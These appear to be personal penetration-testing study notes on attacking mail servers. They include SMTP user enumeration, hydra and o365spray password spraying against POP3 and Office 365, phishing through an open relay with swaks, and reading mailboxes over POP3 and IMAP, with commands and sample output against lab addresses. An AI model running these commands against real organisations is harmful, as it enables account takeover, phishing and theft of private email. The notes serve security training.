| **Port**  | **Service**                                                                |     |
| --------- | -------------------------------------------------------------------------- | --- |
| `TCP/25`  | SMTP Unencrypted                                                           |     |
| `TCP/143` | IMAP4 Unencrypted                                                          |     |
| `TCP/110` | POP3 Unencrypted                                                           |     |
| `TCP/465` | SMTP Encrypted                                                             |     |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |     |
| `TCP/993` | IMAP4 Encrypted                                                            |     |
| `TCP/995` | POP3 Encrypted                                                             |     |

# DNS RECORDS

We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

#### Host - MX Records

```shell-session
$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```shell-session
$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

#### DIG - MX Records

```shell-session
$ dig mx Blackwood.com | grep "MX" | grep -v ";"

Blackwood.com.      300     IN      MX      10 mail1.Blackwood.com.
```

#### Host - A Records

```shell-session
$ host -t A mail1.blackwood.com.

mail1.blackwood.com has address 10.129.14.128
```

These `MX` records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.

This information is essential because the enumeration methods may differ from one service to another. For example, most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.

## Custom mail servers

If we are targetting a custom mail server implementation such as `blackwood.com`, we can enumerate the following ports:

```shell-session
$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## Misconfigurations

Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

### vrfy

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

```shell-session
$ telnet 10.10.110.20 25


VRFY root
```

### EXPN

- `EXPN` stands for "Expand."
- It asks the server to **expand a mailing list or alias**.
- Example: `EXPN all`  
   If the server has a mailing list called `all`, it might return:

```
250 OK: user1@example.com
250 OK: user2@example.com
250 OK: user3@example.com
```

(RETURNS ALL VALID USERS)

### expn a group

```shell-session

EXPN support-team

250 2.0.0 carol@blackwood.com
250 2.1.5 elisa@blackwood.com
```

---

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

#### RCPT TO Command

![](/images/Pasted image 20250703002118.png)

### Enumerate POP3

```shell-session

USER julio

-ERR


USER john

+OK
```

## Automate user enumeration

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate.

```shell-session
$ smtp-user-enum -M RCPT -U userlist.txt -D blackwood.com -t 10.129.121.203 25
```

password brute or spray against pop3

```shell-session
	$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

---

## Cloud Enumeration

As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

## office 365 spray

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

```shell-session
$ python3 o365spray.py --validate --domain msplaintext.xyz

[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames.

```shell-session
$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
```

## Password Attacks

We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

#### Hydra - Password Attack

```shell-session
$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

# Cloud Password Spraying

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore.

```shell-session
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

## Protocol Specifics Attacks

An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

#### Open Relay

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

Attacking Email Services

```shell-session
# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.

```shell-session
# swaks --from notifications@Blackwood.com --to employees@Blackwood.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213


<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@Blackwood.com>
<-  250 OK
 -> RCPT TO:<employees@Blackwood.com>
<-  250 OK
 -> DATA
```

# acess emails

### via POP3

```
└─# telnet $ip 110
USER marlin@blackwood.com

PASS poohbear

LIST

RETR 1
```

### DOWNLOAD EMAIL CLIENT

```shell-session
$ sudo apt-get install evolution
```

```shell-session
]# swaks --from notifications@Blackwood.com --to employees@Blackwood.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution `export WEBKIT_FORCE_SANDBOX=0 && evolution`.
CONFIGURE
https://www.youtube.com/watch?v=xelO2CiaSVs

port num

![](/images/Pasted image 20241019130617.png)

## enumerating valid users via SMTP

```console
$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
```

bruteforce smtp for user discovery:

```
smtp-user-enum -t 10.129.61.91 -M VRFY -U ~/Downloads/footprinting-wordlist.txt -m 90 -v -w 20 |grep exists
```

![](/images/Pasted image 20241019141222.png)
1:\* (BODY[])

---

# IMAP/POP3

| **Command**                                            | **Description**                         |
| ------------------------------------------------------ | --------------------------------------- |
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps`            | Connect to the IMAPS service.           |
| `openssl s_client -connect <FQDN/IP>:pop3s`            |                                         |

fetches the entire content (including headers and body) of all messages in the mailbox.

```
a005 FETCH 1:* (BODY[])
```

- **`SELECT <INBOX>`**: Set the `Inbox` as the current folder.
- **`FETCH 1:* (UID FLAGS)`**: List all messages with basic information.
- **`FETCH 1:* (BODY[])`**: Fetch full details (headers and body) of all messages.

## if fetch no work use this:

```
a FETCH 1 (BODY[])    # Get first message
a FETCH 1:5 (BODY[])  # Get messages 1 through 5
```

```
a FETCH 1 (BODY[])
* 1 FETCH (BODY[] {3661}
HELO dev.blackwood.com
MAIL FROM:<tech@dev.blackwood.com>
RCPT TO:<bob@blackwood.com>
DATA
From: [Admin] <tech@blackwood.com>
To: <tom@blackwood.com>
Date: Wed, 10 Nov 2
```

#### IMAP Commands

PREFIX WITH AX or a

| **Command**                     | **Description**                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | User's login.                                                                                                 |
| `1 LIST "" *`                   | Lists all directories.                                                                                        |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.                                                      |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |

#### POP3 Commands

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

---

## Dangerous Settings

Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:

| **Setting**               | **Description**                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------- |
| `auth_debug`              | Enables all authentication debug logging.                                                 |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.  |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons.                              |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated.                   |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

---
